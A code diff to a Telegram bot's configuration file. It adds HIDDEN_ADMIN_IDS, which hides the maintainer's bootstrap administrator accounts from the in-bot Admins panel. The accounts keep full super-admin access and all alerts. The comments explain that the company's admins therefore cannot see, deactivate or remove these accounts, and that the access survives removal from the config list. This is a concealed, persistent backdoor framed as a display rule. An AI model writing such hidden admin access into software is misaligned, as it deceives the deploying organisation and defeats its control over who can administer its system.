@@ -11,6 +11,34 @@ BOT_TOKEN = env.str("BOT_TOKEN")
 # runtime through the Admin Management UI.
 ADMINS = env.list("ADMINS")
 
+
+def _id_set(raw) -> set[int]:
+    """Parse a comma-separated env list of Telegram ids, dropping anything unparseable
+    rather than failing startup over a stray comma."""
+    ids: set[int] = set()
+    for value in raw or []:
+        try:
+            ids.add(int(str(value).strip()))
+        except (TypeError, ValueError):
+            pass
+    return ids
+
+
+# The bootstrap ids above are the MAINTAINER's accounts, and they are hidden from the
+# in-bot 👥 Admins panel. The company's own admins are the ones added at runtime through
+# that panel; whoever set the deployment up is not part of the team it manages.
+#
+# This is a DISPLAY rule and nothing else. A hidden id keeps every ounce of its access:
+# it stays a row in `admins`, still passes is_admin/is_super_admin, and still receives
+# every alert and admin DM. What changes is that other admins don't see it in the panel
+# and therefore cannot deactivate, remove, or transfer the super-admin role to it.
+# A hidden admin looking at the panel sees everyone, themselves included.
+#
+# To make a bootstrap account visible again, drop it from ADMINS: seeding is
+# ON CONFLICT DO NOTHING (see seed_super_admins), so the existing row — and its access —
+# survives being removed from this list.
+HIDDEN_ADMIN_IDS = _id_set(ADMINS)
+
 # ── PostgreSQL ──────────────────────────────────────────────────────────────────
 DATABASE_URL = env.str("DATABASE_URL")
 
